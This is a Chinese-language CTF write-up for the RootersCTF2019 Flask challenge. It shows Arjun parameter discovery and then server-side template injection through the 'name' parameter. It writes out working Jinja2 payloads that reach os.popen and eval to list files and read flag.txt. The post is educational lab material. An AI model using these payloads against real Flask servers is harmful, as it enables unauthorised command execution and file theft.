---
title: '[RootersCTF2019]I_3_Flask 1'
categories:
  - 
tags: []
abbrlink: c31cd098
date: 2026-03-01 16:14:46
---
# [RootersCTF2019]I_<3_Flask

# 1附Arjun安装使用教程

SSTI（Server-Side Template Injection，服务端模板注入）

---

源代码中有

 <!-- "Metadata. The story behind the data" ~ Elliot Alderson -->



先把arjun安装好



### 1.安装arjun教程

![image-20260301154636224](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260301154636224.png)

如果像我一样由于不使用全局安装，需要在master目录下打开终端下载三个依赖库



在终端依次输入：

1. `pip install dicttoxml -i https://pypi.tuna.tsinghua.edu.cn/simple`
2. `pip install ratelimit -i https://pypi.tuna.tsinghua.edu.cn/simple`
3. `pip install requests -i https://pypi.tuna.tsinghua.edu.cn/simple`



![image-20260301155220182](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260301155220182.png)



### 使用教程：

使用 Python 的 **模块运行模式 (`-m`)**：

- **命令格式**： `python -m arjun -u url -m GET`
- **关键参数**：
  - `-u`：指定题目给你的网址。
  - `-m GET`：告诉工具去 URL 后面找参数（Flask 题目常用）。

```
PS D:\official\Arjun\Arjun-master> python -m arjun -u http://6e0dca84-e29b-451b-815f-424a6221f05a.node5.buuoj.cn:81/ -m GET
    _
   /_| _ '
  (  |/ /(//) v2.2.7
      _/

 Scanning 0/1: http://6e0dca84-e29b-451b-815f-424a6221f05a.node5.buuoj.cn:81/
 Probing the target for stability
 Analysing HTTP response for anomalies
 Logicforcing the URL endpoint
 parameter detected: name, based on: body length
 Parameters found: name
```

当看到 `Parameters found: name` 时，意味着：

- **注入点确定**：该网页接收一个名为 `name` 的参数。
- **下一步公式**：`http://[网址]/?name={% raw %}{{你的Payload}}{% endraw %}`







2.利用参数进行ssti注入（方法选择：实操或者fenjing）

下面展示实操：

https://jishuzhan.net/article/1966023275677007874这篇文章比较全面



![image-20260301160338320](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260301160338320.png)





```
http://6e0dca84-e29b-451b-815f-424a6221f05a.node5.buuoj.cn:81?name={% raw %}{{url_for.__globals__['__builtins__']['__import__']('os').listdir('.')}}{% endraw %}
```

- **`url_for`**: Flask 的一个标准函数。在模板里，它是一个现成的对象。
- **`.__globals__`**: 这是一个字典，包含了该函数定义时所在的全局命名空间。通过它，我们可以跳出模板的限制，访问 Python 的内置库。
- **`['__builtins__']`**: 包含了 Python 最基础的内置函数（如 `print`, `open`, `__import__`）。
- **`['__import__']('os')`**: 相当于在代码里写了 `import os`，加载了操作系统模块。
- **`.listdir('.')`**: 列出当前目录下的所有文件。

得到

![image-20260301160554042](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260301160554042.png)



```
/?name={% raw %}{{url_for.__globals__['__builtins__']['open']('flag.txt').read()}}{% endraw %}
```

利用 Python 内置的 `open` 函数

- **`['open']`**: 找到 Python 原生的文件打开函数。
- **`('flag.txt')`**: 告诉它我要打开哪个文件。
- **`.read()`**: 将打开的文件内容全部读取出来并显示在网页上。



实操二：

```
{% for c in [].__class__.__base__.__subclasses__() %} 
  {% if c.__name__ == 'catch_warnings' %} 
    {% for b in c.__init__.__globals__.values() %} 
      {% if b.__class__ == {}.__class__ %}
        {% if 'eval' in b.keys() %} 
          {% raw %}{{ b['eval']('__import__("os").popen("ls").read()') }}{% endraw %}    //这里的ls就是需要的执行命令
        {% endif %} 
      {% endif %} 
     {% endfor %} 
  {% endif %}
{% endfor %}
```



![image-20260301160911198](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260301160911198.png)

ls换成cat查看命令就ok



实操三：

```
?name={% raw %}{{url_for.__globals__['__builtins__']['__import__']('os').popen('ls').read()}}{% endraw %}
```

cat

```
?name={% raw %}{{url_for.__globals__['__builtins__']['__import__']('os').popen('cat flag.txt').read()}}{% endraw %}
```

